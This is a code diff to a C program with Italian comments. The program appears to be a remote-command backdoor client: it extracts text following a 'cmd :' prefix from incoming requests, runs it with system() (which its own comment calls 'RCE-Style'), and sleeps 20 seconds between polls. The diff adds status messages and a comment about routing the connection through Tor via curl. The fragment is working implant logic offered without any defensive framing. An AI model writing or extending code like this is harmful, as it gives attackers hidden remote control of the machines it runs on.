@@ -144,8 +144,13 @@ int main() {
             char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
             command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
             system(command); // esegui (RCE-Style)
+            printf("Command Executed\n");
+            printf("Sleeping for 20 secs");
+            sleep(20);
         }
         else {sleep(20);}
     }
     return 0;
 }
+
+// connessiove a tor via curl (guarda il volantino di xebynginecli)
